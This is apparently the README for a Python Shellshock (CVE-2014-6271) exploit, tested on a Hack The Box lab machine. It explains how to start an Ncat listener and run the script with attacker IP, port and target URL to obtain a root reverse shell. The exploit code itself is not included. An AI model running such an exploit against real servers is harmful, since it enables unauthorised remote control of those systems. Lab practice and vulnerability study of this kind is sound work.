# Shellshock.py

Shellshock exploit aka CVE-2014-6271. <br>
For more information about the vulnerability visit : https://nvd.nist.gov/vuln/detail/CVE-2014-6271

## Note

---

The exploit was mainly tested on Hack The Box in the 'Beep' box : https://app.hackthebox.eu/machines/Beep <br><br>
**This exploit will only work on web servers having a version of Bash < 4.3**<br>
**through POST request made to .cgi files.**

## Proof of Concept (POC)

---

First of all we can see the arguments that the exploit is taking by running: `shellshock.py -h`<br><br>
![Example 1](img/poc_script_help.png) <br><br>
Then we can set up a Ncat listenner on a port of our choice, here I chose 45<br><br>
![Example 2](img/poc_pre_shell.png) <br><br>
Next we can run the exploit by supplying all the arguments that it takes by running: `shellshock.py [OUR_IP] [OUR_LISTENNING_PORT] [TARGET_URL]`<br>
The target URL here as you can see is where the web server sends a POST request during authentication on that box <br><br>
Here as we can see in the output, the exploit tried sending the payload over SSL using multiple TLS versions, until it succeed <br><br>
![Example 3](img/poc_script.png) <br><br>
And here we got our reverse shell! Lucky enough, the web server was running as root. <br><br>
![Example 4](img/poc_shell.png) <br>
